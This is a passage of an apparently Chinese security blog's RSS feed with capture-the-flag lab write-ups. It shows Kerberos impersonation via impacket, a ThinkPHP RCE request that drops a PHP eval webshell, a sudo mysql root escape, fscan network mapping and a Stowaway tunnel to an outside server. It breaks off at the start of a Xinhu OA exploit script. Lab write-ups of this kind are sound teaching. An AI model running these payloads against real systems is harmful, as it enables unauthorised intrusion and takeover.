&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-getST aoseluauto.com/&lt;span class="s1">&amp;#39;TEST6$&amp;#39;&lt;/span>:&lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate Administrator -dc-ip 172.16.34.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)&lt;/code>现在又出现了这样的错误，当前模拟的用户&lt;code>Administrator&lt;/code>被禁用掉了。换任何一个管理员用户都可以&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/17.png"
width="856"
height="719"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/17_hu_59b493202fd829be.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/17_hu_fb7b94eac9c10a7d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="119"
data-flex-basis="285px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getST aoseluauto.com/&lt;span class="s1">&amp;#39;TEST6$&amp;#39;&lt;/span>:&lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate SVC_NETADM02 -dc-ip 172.16.34.5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>SVC_NETADM02@cifs_ASLSRVAD05.aoseluauto.com@AOSELUAUTO.COM.ccache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo vim /etc/hosts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.5 ASLSRVAD05.aoseluauto.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-wmiexec -k -no-pass ASLSRVAD05.aoseluauto.com -dc-ip 172.16.34.5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\d&lt;/span>esktop&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>&lt;span class="nb">type&lt;/span> flag.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>春秋云镜Initial</title><link>https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/</link><pubDate>Sat, 09 Aug 2025 21:49:36 +0000</pubDate><guid>https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/</guid><description>&lt;p>接下来的日子，博客会多一些春秋云镜的靶场wp，我会尽可能的写清楚，而不是写详细，我看过很多网上的WriteUp，他们大部分只说了步骤，但是从未提及为何&lt;/p>
&lt;h2 id="flag1">flag1
&lt;/h2>&lt;p>看到网站logo为thinkphp的logo，&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/1.png"
width="856"
height="345"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/1_hu_751f493e809b6b75.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/1_hu_e825e5c3738914d1.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="248"
data-flex-basis="595px"
>&lt;/p>
&lt;p>NDAY，发现可以直接RCE，运行&lt;code>curl ip.sb&lt;/code>发现出网，可以弹shell，也可以写马，这里选择写马&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/index.php?s=captcha&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">39.99.234.190&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://39.99.234.190/index.php?s=captcha&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Pragma&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Origin&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://39.99.234.190&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">84&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_method=__construct&amp;amp;filter%5B%5D=system&amp;amp;method=get&amp;amp;server%5BREQUEST_METHOD%5D=echo PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=|base64 -d &amp;gt; shell.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>查看flag权限不够，sudo提权&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>www-data:/var/www/html&lt;span class="o">)&lt;/span> $ sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> www-data on ubuntu-web01:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass, &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User www-data may run the following commands on ubuntu-web01:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> NOPASSWD: /usr/bin/mysql
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mysql -e &lt;span class="s1">&amp;#39;\! /bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mysql -e &lt;span class="s1">&amp;#39;\! find / -name flag*&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mysql -e &lt;span class="s1">&amp;#39;\! tac /root/flag/flag01.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag01: flag&lt;span class="o">{&lt;/span>60b53231-
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2
&lt;/h2>&lt;p>上传fscan进行内网信息收集&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>www-data:/tmp&lt;span class="o">)&lt;/span> $ ifconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eth0: &lt;span class="nv">flags&lt;/span>&lt;span class="o">=&lt;/span>4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt; mtu &lt;span class="m">1500&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet 172.22.1.15 netmask 255.255.0.0 broadcast 172.22.255.255
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet6 fe80::216:3eff:fe37:19b9 prefixlen &lt;span class="m">64&lt;/span> scopeid 0x20&amp;lt;link&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ether 00:16:3e:37:19:b9 txqueuelen &lt;span class="m">1000&lt;/span> &lt;span class="o">(&lt;/span>Ethernet&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX packets &lt;span class="m">400609&lt;/span> bytes &lt;span class="m">182951339&lt;/span> &lt;span class="o">(&lt;/span>182.9 MB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX errors &lt;span class="m">0&lt;/span> dropped &lt;span class="m">0&lt;/span> overruns &lt;span class="m">0&lt;/span> frame &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX packets &lt;span class="m">314801&lt;/span> bytes &lt;span class="m">33381424&lt;/span> &lt;span class="o">(&lt;/span>33.3 MB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX errors &lt;span class="m">0&lt;/span> dropped &lt;span class="m">0&lt;/span> overruns &lt;span class="m">0&lt;/span> carrier &lt;span class="m">0&lt;/span> collisions &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lo: &lt;span class="nv">flags&lt;/span>&lt;span class="o">=&lt;/span>73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt; mtu &lt;span class="m">65536&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet 127.0.0.1 netmask 255.0.0.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet6 ::1 prefixlen &lt;span class="m">128&lt;/span> scopeid 0x10&amp;lt;host&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> loop txqueuelen &lt;span class="m">1000&lt;/span> &lt;span class="o">(&lt;/span>Local Loopback&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX packets &lt;span class="m">1094&lt;/span> bytes &lt;span class="m">96715&lt;/span> &lt;span class="o">(&lt;/span>96.7 KB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX errors &lt;span class="m">0&lt;/span> dropped &lt;span class="m">0&lt;/span> overruns &lt;span class="m">0&lt;/span> frame &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX packets &lt;span class="m">1094&lt;/span> bytes &lt;span class="m">96715&lt;/span> &lt;span class="o">(&lt;/span>96.7 KB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX errors &lt;span class="m">0&lt;/span> dropped &lt;span class="m">0&lt;/span> overruns &lt;span class="m">0&lt;/span> carrier &lt;span class="m">0&lt;/span> collisions &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>./fscan -h 172.22.1.15/24&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">(icmp) Target 172.22.1.2 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(icmp) Target 172.22.1.15 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(icmp) Target 172.22.1.21 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(icmp) Target 172.22.1.18 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Icmp alive hosts len is: 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.18:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.2:88 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.15:22 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.15:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.2:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.21:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.21:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.21:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.2:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.18:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.18:3306 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.18:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.18:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.2:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.1.15:10010 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] alive ports len is: 15
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] WebTitle http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] WebTitle http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*]172.22.1.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]DC01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]172.22.1.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*]172.22.1.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]XIAORANG-OA01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]172.22.1.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*]172.22.1.21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]XIAORANG-WIN7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [-&amp;gt;]172.22.1.21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] MS17-010 172.22.1.21 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] OsInfo 172.22.1.2 (Windows Server 2016 Datacenter 14393)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] NetBios 172.22.1.2 [+] DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>整理一下信息&lt;/p>
&lt;ul>
&lt;li>172.22.1.21 XIAORANG-WIN7.xiaorang.lab MS17-010&lt;/li>
&lt;li>172.22.1.18 XIAORANG-OA01.xiaorang.lab(信呼OA)&lt;/li>
&lt;li>172.22.1.15 已经被控&lt;/li>
&lt;li>172.22.1.2 DC01.xiaorang.lab&lt;/li>
&lt;/ul>
&lt;p>使用&lt;strong>stowaway&lt;/strong>搭建内网代理 &lt;a class="link" href="https://github.com/ph4ntonn/Stowaway/releases/tag/v2.2" target="_blank" rel="noopener"
>https://github.com/ph4ntonn/Stowaway/releases/tag/v2.2&lt;/a> 搭建反向代理，把&lt;code>admin&lt;/code>放在服务器上面，&lt;code>agent&lt;/code>放在靶机上面&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./linux_x64_admin -l &lt;span class="m">1234&lt;/span> -s &lt;span class="m">123&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./linux_x64_agent -c 156.238.233.93:1234 -s &lt;span class="m">123&lt;/span> --reconnect &lt;span class="m">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socks &lt;span class="m">5555&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>现在我们就搭建好了socks5的代理了，使用&lt;code>proxifier&lt;/code>弄一个全局代理&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/2.png"
width="1411"
height="859"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/2_hu_372436f5a83a3436.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/2_hu_76e54da424226083.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="164"
data-flex-basis="394px"
>&lt;/p>
&lt;p>信呼OA这个系统刚好版本也是可以用NDAY打的&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url_pre&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;http://172.22.1.18/&amp;#39;&lt;/span>
